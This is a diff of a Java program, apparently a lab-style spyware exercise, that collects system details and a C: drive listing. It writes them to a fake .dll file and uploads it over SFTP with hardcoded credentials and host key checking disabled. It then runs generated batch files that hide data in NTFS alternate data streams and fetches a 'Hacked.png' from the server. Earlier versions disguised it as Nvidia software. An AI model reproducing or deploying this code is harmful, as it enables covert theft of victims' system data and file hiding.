@@ -8,7 +8,6 @@ import java.io.*;
 import java.net.InetAddress;
 import java.net.URI;
 import java.net.URISyntaxException;
-import java.net.UnknownHostException;
 import java.util.*;
 
 
@@ -21,7 +20,7 @@ public class Main {
             // Creates a Desktop object
             Desktop desktop = Desktop.getDesktop();
             // Invokes a desktop method browse and opens the provided link
-            desktop.browse(new URI("https://www.nvidia.com/en-au/"));
+            desktop.browse(new URI("http://www.ek-creations.c1.biz"));
         } catch (URISyntaxException uri) {
             // Catches the Exceptions
             System.out.println("Error Incorrect String");
@@ -30,9 +29,9 @@ public class Main {
             System.out.println("Error IO Exception Thrown");
         }
 
-        //Creating a File object for directory
+        // Creating a File object for directory - Gets a list of all files in the C:drive
         File dirListC = new File("C:\\");
-        //List of all files and directories
+        // List of all files and directories is stored in the array
         String filesInDir[] = dirListC.list();
 
         // Gets & Stores System Information
@@ -53,10 +52,12 @@ public class Main {
         String processorArchitecture = System.getenv("PROCESSOR_ARCHITECTURE");
         String processorNumbers = System.getenv("NUMBER_OF_PROCESSORS");
 
+        // Gets Users TimeZone
         TimeZone timeZone = Calendar.getInstance().getTimeZone();
         String userTimezone = timeZone.getDisplayName();
         String userTimezoneID = timeZone.getID();
 
+        // String Containing all the Collected Information
         String sysInfo = "OS NAME: " + osName + "\n" +
                 "Version: " + osVersion + "\n" +
                 "System Type: " + osArchDataModel + "\n" +
@@ -75,75 +76,107 @@ public class Main {
                 "User Timezone ID: " + userTimezoneID + "\n" +
                 "User Language: " + userLanguage + "\n";
 
+        // Creating a Popup Windows
         JFrame windowPopup = new JFrame();
-        ImageIcon image = new ImageIcon(Main.class.getResource("Nvida.png"));
+        // Setting an Icon
+        ImageIcon image = new ImageIcon(Main.class.getResource("logo.png"));
         Image getImage = image.getImage();
+        // Re-Scaling the Icon
         Image resizedImage = getImage.getScaledInstance(128, 128, java.awt.Image.SCALE_SMOOTH);
         image = new ImageIcon(resizedImage);
 
-        FileWriter fileWriter = new FileWriter("Infos3785646s3838975.dll");
+        // Create a File in the Directory of Execution
+        FileWriter fileWriter = new FileWriter("EKCreations.dll");
+        // Calls a function which saves all collected data into the file given up
         saveInfoToFile(filesInDir, sysInfo, fileWriter);
 
-        File file = new File(userHome + "/Infos3785646s3838975.dll");
+        // Create a File in the Directory of Users Home
+        File file = new File(userHome + "/EKCreations.dll");
         FileWriter fileWriter2 = new FileWriter(file);
+        // Calls a function which saves all collected data into the file given up
         saveInfoToFile(filesInDir, sysInfo, fileWriter2);
 
+        // Calls the function to store the file with collected data to an sftp server
         storeDataToServer(file);
 
+        // Creates a batch file Function is called
         createBatchFile();
-        File file3 = new File(userHome + "\\Nvida.bat");
+        // Deletes the batch file that was created
+        File file3 = new File(userHome + "\\EKCreations.bat");
         file3.delete();
 
+        // Downloads a file from the sftp Server
         getFileFromServer();
 
+        // Creates another Batch File
         createBatchFile2();
 
-        JOptionPane.showMessageDialog(windowPopup, sysInfo, "Nvida - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);
+        // Displays the popup pane created earlier
+        JOptionPane.showMessageDialog(windowPopup, sysInfo, "EK Creations - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);
 
+        // Quits the program
         System.exit(0);
     }
 
     private static void saveInfoToFile(String[] filesInDir, String sysInfo, FileWriter fileWriter) throws IOException {
+        // Writes info using the buffered writer into the files specified
         BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
         PrintWriter out = new PrintWriter(bufferedWriter);
+        // Prints into the file a text and the sysinfo that was collected
         out.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);
 
+        // Also prints into the file a text and the c:\drive dir listings from the array it was stored in
         out.println("\nList of Folders & Files in the local C Drive:\n");
         for (int i = 0; i < filesInDir.length; i++) {
             out.println(filesInDir[i]);
         }
+        // Closes the buffered writer
         bufferedWriter.close();
     }
 
     private static void storeDataToServer(File file) throws JSchException, SftpException, FileNotFoundException {
-        JSch jsch = new JSch();
-        Session session = jsch.getSession("a2a", "192.168.0.67");
-        session.setConfig("StrictHostKeyChecking", "no");
-        session.setPassword("a2a");
-        session.connect();
-        ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
-        channel.connect();
-        channel.cd("/");
+        try {
+            // Creates a new JSch object
+            JSch jsch = new JSch();
+            // Details to connect to the server provided
+            Session session = jsch.getSession("sftpserver", "192.168.0.67");
+            // Used for less security measures so no need a public key just a password and username
+            session.setConfig("StrictHostKeyChecking", "no");
+            session.setPassword("sftpserver");
+            // Connects to the server
+            session.connect();
+            // Defines the server type
+            ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
+            channel.connect();
+            // Path in the Server
+            channel.cd("/");
 
-        FileInputStream fis = new FileInputStream(file);
-        channel.put(fis, file.getName());
+            // A new file input stream object of the file given through parameters
+            FileInputStream fis = new FileInputStream(file);
+            // Puts the file in the server
+            channel.put(fis, file.getName());
 
-        channel.disconnect();
-        session.disconnect();
+            // Closes the connection
+            channel.disconnect();
+            session.disconnect();
+        } catch (Exception ex){
+        }
     }
 
     private static void createBatchFile(){
         String userHome = System.getProperty("user.home");
         try {
 
-            File readme = new File(userHome + "/readme.txt");
+            // Creates a file and opens a writer to write to it
+            File readme = new File(userHome + "/EKCreations.txt");
+            // Below 4 lines not needed since we are writing nothing in the file
             FileWriter fileWriter2 = new FileWriter(readme);
             BufferedWriter bufferedWriter = new BufferedWriter(fileWriter2);
             PrintWriter out = new PrintWriter(bufferedWriter);
             bufferedWriter.close();
 
-            // create new file called sample in "c" drive
-            File file2 = new File(userHome + "/Nvida.bat");
+            // create new file called EKCreations.bat in "c" drive
+            File file2 = new File(userHome + "/EKCreations.bat");
             FileOutputStream fos = new FileOutputStream(file2);
 
             // write some commands to the file
@@ -152,18 +185,20 @@ public class Main {
             dos.writeBytes("\n");
             dos.writeBytes("cd %userprofile%");
             dos.writeBytes("\n");
-            dos.writeBytes("type Infos3785646s3838975.dll > readme.txt:hiddenfile.dll");
+            dos.writeBytes("type EKCreations.dll > EKCreations.txt:hiddenfile.dll");
             dos.writeBytes("\n");
             dos.writeBytes("exit");
 
             // execute the batch file
-            Process p = Runtime.getRuntime().exec("cmd /c start " + userHome + "/Nvida.bat");
+            Process p = Runtime.getRuntime().exec("cmd /c start " + userHome + "/EKCreations.bat");
 
             // wait for termination
             p.waitFor();
 
+            // Closes the output stream
             dos.close();
 
+            // Calls the function to store the readme file into the server
             storeDataToServer(readme);
 
         } catch (Exception ex) {
@@ -174,8 +209,8 @@ public class Main {
         String userHome = System.getProperty("user.home");
         try {
 
-            // create new file called sample in "c" drive
-            File file2 = new File(userHome + "/Desktop/startmes3785646s3838975.bat");
+            // create new file called EKCreations.bat in the desktop
+            File file2 = new File(userHome + "/Desktop/EKCreations.bat");
             FileOutputStream fos = new FileOutputStream(file2);
 
             // write some commands to the file
@@ -184,21 +219,22 @@ public class Main {
             dos.writeBytes("\n");
             dos.writeBytes("cd %userprofile% /Desktop");
             dos.writeBytes("\n");
-            dos.writeBytes("type Hacked.png > startmes3785646s3838975.bat:hiddenfile.png");
+            dos.writeBytes("type Hacked.png > EKCreations.bat:hiddenfile.png");
             dos.writeBytes("\n");
             dos.writeBytes("del Hacked.png");
             dos.writeBytes("\n");
-            dos.writeBytes("\"%windir%\\system32\\mspaint.exe\" startmes3785646s3838975.bat:hiddenfile.png");
+            dos.writeBytes("\"%windir%\\system32\\mspaint.exe\" EKCreations.bat:hiddenfile.png");
             dos.writeBytes("\n");
             dos.writeBytes("exit");
 
 
             // execute the batch file
-            Process p = Runtime.getRuntime().exec("cmd /c start /MIN " + userHome + "/Desktop/startmes3785646s3838975.bat");
+            Process p = Runtime.getRuntime().exec("cmd /c start /MIN " + userHome + "/Desktop/EKCreations.bat");
 
             // wait for termination
             p.waitFor();
 
+            // Closes the output stream
             dos.close();
 
         } catch (Exception ex) {
@@ -206,20 +242,31 @@ public class Main {
     }
 
     private static void getFileFromServer() throws SftpException, JSchException, IOException {
-        String userHome = System.getProperty("user.home");
-        JSch jsch = new JSch();
-        Session session = jsch.getSession("a2a", "192.168.0.67");
-        session.setConfig("StrictHostKeyChecking", "no");
-        session.setPassword("a2a");
-        session.connect();
-        ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
-        channel.connect();
-        channel.cd("/");
 
-        channel.get("Hacked.png" , userHome + "/Desktop");
+        try {
+            String userHome = System.getProperty("user.home");
+            // Creates a new JSch object
+            JSch jsch = new JSch();
+            // Details to connect to the server provided
+            Session session = jsch.getSession("sftpserver", "192.168.0.67");
+            // Used for less security measures so no need a public key just a password and username
+            session.setConfig("StrictHostKeyChecking", "no");
+            session.setPassword("sftpserver");
+            // Connects to the server
+            session.connect();
+            // Defines the server type
+            ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
+            channel.connect();
+            // Path in the Server
+            channel.cd("/");
+            // File to get from the server and download it to the local device
+            channel.get("Hacked.png", userHome + "/Desktop");
 
-        channel.disconnect();
-        session.disconnect();
+            // Closes the connection
+            channel.disconnect();
+            session.disconnect();
+        } catch (Exception ex){
+        }
     }
 
 
